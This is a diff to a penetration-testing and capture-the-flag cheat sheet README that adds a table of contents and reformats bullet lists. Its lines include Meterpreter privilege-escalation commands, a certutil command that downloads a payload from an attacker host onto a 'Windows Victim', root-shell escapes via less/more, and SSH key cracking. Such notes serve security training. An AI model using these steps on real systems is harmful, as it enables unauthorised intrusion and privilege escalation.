@@ -4,6 +4,67 @@
 
 ---
 
+## Contents
+
+<!-- toc -->
+
+- [System Hacking](#system-hacking)
+  - [Nmap Scanning](#nmap-scanning)
+  - [Netdiscover Scanning](#netdiscover-scanning)
+  - [Nikto Scanning](#nikto-scanning)
+  - [WebServer is Open](#webserver-is-open)
+  - [SMB is Open](#smb-is-open)
+  - [To Extract and Mount VHD Drive Files](#to-extract-and-mount-vhd-drive-files)
+  - [To search for Exploits on Metasploit by Name](#to-search-for-exploits-on-metasploit-by-name)
+- [Wordpress Open](#wordpress-open)
+  - [RPC Open](#rpc-open)
+  - [Powershell](#powershell)
+- [Web Hacking](#web-hacking)
+  - [Five Stages of Web Hacking](#five-stages-of-web-hacking)
+  - [Enumeration and Reconnaissance Tools](#enumeration-and-reconnaissance-tools)
+  - [Scanning](#scanning)
+  - [Payloads](#payloads)
+  - [Shells](#shells)
+  - [BufferOverflow](#bufferoverflow)
+  - [Gobuster with Cookie (Useful to directory traversal when cookie is needed )](#gobuster-with-cookie-useful-to-directory-traversal-when-cookie-is-needed-)
+  - [SQLMAP](#sqlmap)
+- [File Hacking](#file-hacking)
+  - [Extract hidden text from PDF Files](#extract-hidden-text-from-pdf-files)
+  - [Compress File Extraction](#compress-file-extraction)
+  - [Extract hidden strings](#extract-hidden-strings)
+- [Cryptography](#cryptography)
+  - [Caesar Cipher](#caesar-cipher)
+  - [Vigenere Cipher](#vigenere-cipher)
+  - [One Time Pad Cipher](#one-time-pad-cipher)
+- [Forensics](#forensics)
+  - [Image File](#image-file)
+  - [Binwalk](#binwalk)
+  - [Extract NTFS Filesystem](#extract-ntfs-filesystem)
+  - [Recover Files from Deleted File Systems](#recover-files-from-deleted-file-systems)
+  - [Packet Capture](#packet-capture)
+  - [JavaScript Deobfuscator](#javascript-deobfuscator)
+- [Password Cracking](#password-cracking)
+  - [JOHN the ripper](#john-the-ripper)
+  - [SAM Hashes](#sam-hashes)
+  - [Linux User Hashes](#linux-user-hashes)
+  - [Hashcat](#hashcat)
+- [Privilige Escalation](#privilige-escalation)
+  - [Standard Scripts for Enumeration](#standard-scripts-for-enumeration)
+  - [Dirtycow](#dirtycow)
+  - [Sudo](#sudo)
+  - [Gain More Privilige on windows system](#gain-more-privilige-on-windows-system)
+  - [MYSQL with Sudo Privilage](#mysql-with-sudo-privilage)
+  - [VIM Editor with Sudo Privilage](#vim-editor-with-sudo-privilage)
+  - [Cronjob](#cronjob)
+  - [More or Less Command](#more-or-less-command)
+  - [Improve Shell](#improve-shell)
+  - [Transfer Files from Host to Target Machine](#transfer-files-from-host-to-target-machine)
+- [Tools](#tools)
+  - [Reconnoitre](#reconnoitre)
+- [How To Contribute](#how-to-contribute)
+
+<!-- tocstop -->
+
 ## System Hacking 
 
 ### Nmap Scanning
@@ -177,15 +238,15 @@ To bypass execution policy
 
 ### Enumeration and Reconnaissance Tools
 
-* Whois, Nslookup, Dnsrecon, Google Fu, Dig - To passively enumerate website.
-* [Sublist3r](https://github.com/aboul3la/Sublist3r) - Subdomains enumeration tool.
-* [crt.sh](http://crt.sh) - Certificate enumeration tool.
-* [Hunter.io](https://hunter.io/) - Email enumeration tool.
-* Nmap, Wappalyzer, Whatweb, Builtwith, Netcat - Fingerprinting tools.
-* HaveIbeenPwned - Useful for breach enumeraton.
-* Use [SecurityHeaders](https://securityheaders.com/) to find some misconfigured header information on target website.
-* Use Zap Proxy tool to extract hidden files/directories.
-* Clear Text Passwords [Link](https://github.com/philipperemy/tensorflow-1.4-billion-password-analysis)
+- Whois, Nslookup, Dnsrecon, Google Fu, Dig - To passively enumerate website.
+- [Sublist3r](https://github.com/aboul3la/Sublist3r) - Subdomains enumeration tool.
+- [crt.sh](http://crt.sh) - Certificate enumeration tool.
+- [Hunter.io](https://hunter.io/) - Email enumeration tool.
+- Nmap, Wappalyzer, Whatweb, Builtwith, Netcat - Fingerprinting tools.
+- HaveIbeenPwned - Useful for breach enumeraton.
+- Use [SecurityHeaders](https://securityheaders.com/) to find some misconfigured header information on target website.
+- Use Zap Proxy tool to extract hidden files/directories.
+- Clear Text Passwords [Link](https://github.com/philipperemy/tensorflow-1.4-billion-password-analysis)
 
 To gather information from online sources.
 
@@ -371,7 +432,7 @@ If you find `!` in the cipher text and cipher seems to be within certain range o
 ### Vigenere Cipher
 
 To break Vigenere ciphers without knowing the key.
-* Use this website [Link](https://www.guballa.de/vigenere-solver) - Bruteforce solver.
+- Use this website [Link](https://www.guballa.de/vigenere-solver) - Bruteforce solver.
 
 ### One Time Pad Cipher
 To solve One Time Pad, Use [OTP](http://rumkin.com/tools/cipher/otp.php).
@@ -497,11 +558,11 @@ To crack the password, we can use `hashcat` here 500 is for format `$1$` Replace
 ## Privilige Escalation
 
 ### Standard Scripts for Enumeration
-* [Linux Priv Checker](https://github.com/sleventyeleven/linuxprivchecker) - Linux Privilige Enumeration Checker.
-* [Lin Enum Script](https://github.com/rebootuser/LinEnum)
-* [Unix Priv Check](https://github.com/pentestmonkey/unix-privesc-check)
-* [Pspy](https://github.com/DominicBreuker/pspy) - Gather information on cron, proceses.
-* [Gtfobins](https://gtfobins.github.io/) - If we dont exactly remember how to use a given setuid command to get Privliges.
+- [Linux Priv Checker](https://github.com/sleventyeleven/linuxprivchecker) - Linux Privilige Enumeration Checker.
+- [Lin Enum Script](https://github.com/rebootuser/LinEnum)
+- [Unix Priv Check](https://github.com/pentestmonkey/unix-privesc-check)
+- [Pspy](https://github.com/DominicBreuker/pspy) - Gather information on cron, proceses.
+- [Gtfobins](https://gtfobins.github.io/) - If we dont exactly remember how to use a given setuid command to get Privliges.
 
 ### Dirtycow 
 
@@ -531,19 +592,19 @@ uid=1001(enemy) gid=1001(enemy) groups=1001(enemy)
 ```
 
 ### Gain More Privilige on windows system
-* In meterpreter shell try `getsystem`
-* In meterpreter shell try `background` and then follow rest of commands.
-* search suggester
+- In meterpreter shell try `getsystem`
+- In meterpreter shell try `background` and then follow rest of commands.
+- search suggester
 ```
 > use post/multi/recon/local_exploit_suggestor
 show options
 set session 1
 run
 ```
-* If worked fine, else Try follow rest of commands.
-* Use this link: [FuzzySec Win Priv Exec](https://www.fuzzysecurity.com/tutorials/16.html)
-* Use this method: [Sherlock](https://github.com/rasta-mouse/Sherlock)
-* If current process doesnt own Privs, use `migrate <PID>` to get more Priviliges in Meterpretor.
+- If worked fine, else Try follow rest of commands.
+- Use this link: [FuzzySec Win Priv Exec](https://www.fuzzysecurity.com/tutorials/16.html)
+- Use this method: [Sherlock](https://github.com/rasta-mouse/Sherlock)
+- If current process doesnt own Privs, use `migrate <PID>` to get more Priviliges in Meterpretor.
 
 
 To get Shell on Windows use [Unicorn](https://github.com/trustedsec/unicorn.git)
@@ -597,7 +658,7 @@ Nov 19 00:05:01 sun CRON[5701]: (root) CMD (python /home/sun/Documents/script.py
 
 ### More or Less Command 
 
-* If any file we found in low priv user and it contains something like this, we can execute it and minimize the size of terminal to enter the visual mode and enter `!/bin/bash` to get root shell
+- If any file we found in low priv user and it contains something like this, we can execute it and minimize the size of terminal to enter the visual mode and enter `!/bin/bash` to get root shell
 ```
 > $ cat new.sh 
 #!/bin/bash
@@ -628,11 +689,11 @@ www-data@machine:/var/www/html$ export TERM=xterm
 ```
 
 ### Transfer Files from Host to Target Machine
-* Use `python -m SimpleHTTPServer` in the host folder.
-* Use Apache and put files in `/var/www/html/` folder.
-* If Tomcat is Opened, upload the file/payload using the Admin panel.
-* If wordpress is running, upload the file as plugin.
-* In Windows Victim, use `certutil -urlcache -f http://<HOST_IP>/<FILE_NAME> <OUTPUT_FILE_NAME>`
+- Use `python -m SimpleHTTPServer` in the host folder.
+- Use Apache and put files in `/var/www/html/` folder.
+- If Tomcat is Opened, upload the file/payload using the Admin panel.
+- If wordpress is running, upload the file as plugin.
+- In Windows Victim, use `certutil -urlcache -f http://<HOST_IP>/<FILE_NAME> <OUTPUT_FILE_NAME>`
 
 
 
@@ -640,22 +701,22 @@ www-data@machine:/var/www/html$ export TERM=xterm
 
 ### Reconnoitre
 Security tool for multithreaded information gathering and service enumeration whilst building directory structures to store results, along with writing out recommendations for further testing.
-* [Link](https://github.com/codingo/Reconnoitre)
+- [Link](https://github.com/codingo/Reconnoitre)
 ```
 > $ reconnoitre -t 10.10.10.37 -o `pwd` --services`
 ```
 
-* Total Commander - multi purpose terminal for Hacking. Link : www.ghisler.com
-* CTF Exploitation Framework : GitHub.com/Gallopsled/pwntools `pip install pwntools`
-* When using GDB, we can create "~/.gdbinit" file and add this line "set disassembly-flavor intel" to make intel synatx.
-* Dirbuster for enumeration web server Attacks.
-* [Gobuster](https://github.com/OJ/gobuster) - Used for advanced enumeration.
-* [Nmap Automator](https://github.com/21y4d/nmapAutomator)
-* 7z Password Cracking: Use tool `7z2john`
-* SSH Password Cracking: `/usr/share/john/ssh2john.py id_rsa > output.hash`
-* [Quipqiup - Substitution Cipher Solver](https://quipqiup.com/)
-* [GDB Peda](https://github.com/longld/peda)
-* [Search Code - Based on Funcion name and code-snippet](https://searchcode.com/)
+- Total Commander - multi purpose terminal for Hacking. Link : www.ghisler.com
+- CTF Exploitation Framework : GitHub.com/Gallopsled/pwntools `pip install pwntools`
+- When using GDB, we can create "~/.gdbinit" file and add this line "set disassembly-flavor intel" to make intel synatx.
+- Dirbuster for enumeration web server Attacks.
+- [Gobuster](https://github.com/OJ/gobuster) - Used for advanced enumeration.
+- [Nmap Automator](https://github.com/21y4d/nmapAutomator)
+- 7z Password Cracking: Use tool `7z2john`
+- SSH Password Cracking: `/usr/share/john/ssh2john.py id_rsa > output.hash`
+- [Quipqiup - Substitution Cipher Solver](https://quipqiup.com/)
+- [GDB Peda](https://github.com/longld/peda)
+- [Search Code - Based on Funcion name and code-snippet](https://searchcode.com/)
 
 ## How To Contribute
 Please follow the instructions in [CONTRIBUTING](contributing.md) file and beware of [CODE_OF_CONDUCT](code-of-conduct.md).
